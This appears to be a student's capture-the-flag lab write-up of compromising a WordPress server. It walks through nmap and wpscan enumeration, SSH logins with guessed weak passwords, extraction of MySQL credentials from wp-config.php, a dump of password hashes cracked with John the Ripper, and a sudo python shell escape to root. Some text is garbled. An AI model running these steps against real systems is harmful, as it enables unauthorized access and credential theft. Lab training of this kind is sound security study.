# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

## Exposed Services
Nmap scan results for each machine reveal the below services and OS details:  
~~~
nmap -sV 192.168.1.110  
~~~

![red111](https://user-images.githubusercontent.com/32025331/155897831-3ed2d82f-ea06-4b2b-88a5-ca45a22de921.PNG)   

This scan identifies the services below as potential points of entry:  
  
Target 1  
- OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)  
- Apache httpd 2.4.10 ((Debian))  
  
The following vulnerabilities were identified on each target:
- Target 1
- Weak server password
- Unsalted hashed passwords
- Unpatched WordPress software
  
 ## Exploitation
The Red Team was able to penetrate Target 1 and retrieve the following confidential data:


### flag1{b9bbcb33e11b80be759c4e844862482d}
Tools used: dirb, wpscan  
- Using dirb we were able to find a wordpress page: 192.168.1.110/wordpress  

![red10](https://user-images.githubusercontent.com/32025331/155897106-083e1297-c5d6-490f-af59-1ac251500554.PNG)


- From there we ran wpscan: 
~~~
wpscan -–url http://192.168.1.110/wordpress --wp-content-dir -at -eu
~~~
![red13](https://user-images.githubusercontent.com/32025331/155897592-cb46a654-efc7-48f6-a220-833e3841df88.PNG)  

We then found two login names: Steven and Michael  
![red14](https://user-images.githubusercontent.com/32025331/155897593-ce8c5a5b-778a-486d-9d9d-c38249113aa4.PNG)  

By sheer luck, we guessed the password without brute force:  
~~~
ssh michael@192.168.1.110
Password: michael
cd ../../var/www/html
grep -RE flag1
~~~
![red4](https://user-images.githubusercontent.com/32025331/155894959-9c35c8ed-fc7c-4049-8b13-c03f6d785452.PNG)  
  
  
**flag2{fc3fd58dcdad9ab23faca6e9a36e581c}**  
Using the same credentials, we SSH into the webserver:
~~~ 
ssh michael@192.168.1.110
Password: michael
cd ../../var/www/
grep -RE flag2
~~~
![red15](https://user-images.githubusercontent.com/32025331/155897666-7187d4ef-e7dc-4231-985f-f4c87a644dfa.PNG)


**flag3{afc01ab56b50591e7dccf93122770cd2}**  
**flag4{715dea6c055b9fe3337544932f2941ce}**  
Tools used: SSH, MySQL  
~~~
ssh michael@192.168.1.110
Password: michael
cd /var/www/html/wordpress
nano wp-config.php  
~~~

![red5](https://user-images.githubusercontent.com/32025331/155894960-bc91d0f1-f6ac-4d95-bc81-c3027734bba8.PNG)  
Within wp-config.php we were able to find credentials to a MySQL database.
~~~
mysql -u root -pR@v3nSecurity
show databases;
use wordpress;
show tables;
select post_content from wp_posts;
~~~
![red9](https://user-images.githubusercontent.com/32025331/155896987-d9932ea6-75bb-4b88-ae79-67f5b9a46999.PNG)  
  
**Flag 4 from Steven’s account**  
- Tools used: SSH, MySQL, johntheripper  
- Using the MySQL credentials from before:  
~~~
mysql -u root -pR@v3nSecurity
show databases;
use wordpress;
show tables;
select user_login, user_pass from wp_users;
~~~  
We found the hashed passwords within ^#%$.  
Exit back out to Kali. From here we can use John the Ripper:  
![red6](https://user-images.githubusercontent.com/32025331/155894961-05ed83c8-ab77-40f0-b8e0-33995815607d.PNG)  
SSH into the webserver using Steven’s credentials:  
~~~
Ssh steven@192.168.1.110
Password: pink84
~~~
Now we run a python exploit:
~~~
sudo /usr/bin/python -c 'import os;os.system("/bin/sh")'
cd root
cat flag4.txt
~~~
[picture]
